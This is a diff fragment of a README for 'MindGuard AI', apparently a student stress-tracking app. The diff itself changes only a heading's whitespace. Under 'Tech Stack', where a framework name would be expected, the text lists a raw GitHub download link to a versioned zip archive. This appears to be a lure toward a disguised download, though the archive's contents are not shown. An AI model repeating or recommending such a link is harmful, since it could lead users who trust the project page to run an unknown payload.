@@ -10,7 +10,7 @@ Students often experience academic stress but lack simple tools to track and und
 ## 💡 Solution
 MindGuard AI provides a daily stress check-in system where users enter sleep hours, workload, and mood. The system analyzes this data and classifies stress levels instantly.
 
-## ⚙️ Tech Stack
+## ⚙️ Tech Stack 
 Frontend:
 - https://github.com/rahuldounde21/mindguard-ai/raw/refs/heads/main/src/components/mindguard_ai_3.3.zip
 - JavaScript
